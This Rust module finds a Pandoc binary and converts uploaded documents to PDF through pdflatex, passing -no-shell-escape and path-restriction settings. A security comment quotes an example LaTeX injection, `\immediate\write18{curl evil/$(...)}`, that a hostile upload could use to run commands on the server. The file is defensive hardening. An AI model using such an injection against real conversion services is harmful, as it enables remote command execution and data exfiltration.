// Pandoc utility for runtime usage

use crate::common::AppError;
use std::path::PathBuf;
use std::process::Command;

/// Find Pandoc binary path
pub fn find_pandoc() -> Result<PathBuf, AppError> {
    // Try embedded binary first (extracted to app_data_dir/bin/)
    match super::embedded::get_pandoc_path() {
        Ok(path) => {
            tracing::debug!("Using embedded Pandoc at {:?}", path);
            return Ok(path.clone());
        }
        Err(e) => {
            tracing::warn!("Failed to get embedded Pandoc: {}, trying system", e);
        }
    }

    // Fall back to system pandoc
    match which::which("pandoc") {
        Ok(path) => {
            tracing::debug!("Found system Pandoc at {:?}", path);
            Ok(path)
        }
        Err(_) => Err(AppError::internal_error(
            "Pandoc not found. Embedded binary failed to extract and system pandoc not installed.",
        )),
    }
}

/// Convert document to PDF using Pandoc
pub async fn convert_to_pdf(
    input_path: &PathBuf,
    output_path: &PathBuf,
) -> Result<(), AppError> {
    let pandoc_path = find_pandoc()?;

    // SECURITY: pdflatex defaults (in texlive-full) honor `\write18{cmd}`
    // and `\immediate\write18{cmd}` macros to run arbitrary shell commands
    // as the server uid. A hostile DOCX / PPTX / RTF / ODT upload could
    // embed `\immediate\write18{curl evil/$(...)}` and Pandoc would route
    // it through pdflatex unchanged. Closes 05-file F-01 (Critical).
    //
    // The fix passes `-no-shell-escape` as a pdflatex option via
    // Pandoc's `--pdf-engine-opt`, which Pandoc forwards verbatim to the
    // engine. We also set `openout_any=p` so pdflatex can only write
    // into paths underneath the current working directory (which is the
    // server's temp dir for this conversion).
    let output = Command::new(pandoc_path)
        .arg(input_path)
        .arg("-o")
        .arg(output_path)
        .arg("--pdf-engine=pdflatex")
        .arg("--pdf-engine-opt=-no-shell-escape")
        .arg("--pdf-engine-opt=-interaction=nonstopmode")
        .env("openout_any", "p")
        .env("openin_any", "p")
        .output()
        .map_err(|e| AppError::internal_error(format!("Failed to run Pandoc: {}", e)))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(AppError::internal_error(format!(
            "Pandoc PDF conversion failed: {}",
            stderr
        )));
    }

    Ok(())
}
